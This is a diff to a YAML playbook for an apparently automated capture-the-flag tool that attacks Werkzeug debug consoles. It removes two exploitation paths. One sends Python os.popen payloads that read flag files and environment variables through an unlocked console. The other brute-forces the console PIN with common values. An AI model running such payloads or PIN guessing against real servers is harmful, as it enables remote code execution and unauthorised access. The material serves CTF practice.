@@ -55,45 +55,6 @@ detection:
 exploitation:
   stop_on_flag: true
   paths:
-    - id: no_pin_rce
-      name: "RCE Without PIN"
-      requires_signal: pin_disabled
-      technique: werkzeug_console_rce
-      steps:
-        - id: exec_commands
-          action: http_probe
-          with:
-            payloads:
-              - "__import__('os').popen('cat /flag.txt').read()"
-              - "__import__('os').popen('cat /flag').read()"
-              - "__import__('os').popen('cat /app/flag.txt').read()"
-              - "__import__('os').popen('cat flag.txt').read()"
-              - "__import__('os').popen('env | grep -i flag').read()"
-              - "__import__('os').popen('env | grep -i pico').read()"
-              - "__import__('os').popen('find / -name flag.txt 2>/dev/null').read()"
-            inject_into: console_exec
-          capture:
-            - pattern: 'picoCTF\\{[^}]+\\}'
-              as: flag_value
-            - pattern: 'flag\\{[^}]+\\}'
-              as: flag_value
-
-    - id: pin_bruteforce
-      name: "PIN Brute Force"
-      requires_signal: werkzeug_console_found
-      technique: werkzeug_pin_bruteforce
-      steps:
-        - id: common_pins
-          action: http_probe
-          with:
-            payloads: ["000-000-000", "123-456-789", "111-111-111", "000-000-001"]
-            inject_into: pin_field
-          signals:
-            - match: "Correct PIN|authenticated|success"
-              on_match:
-                confidence_boost: 0.95
-                emit: pin_cracked
-
     - id: pin_generation_exploit
       name: "PIN Generation Exploit"
       requires_signal: werkzeug_console_found
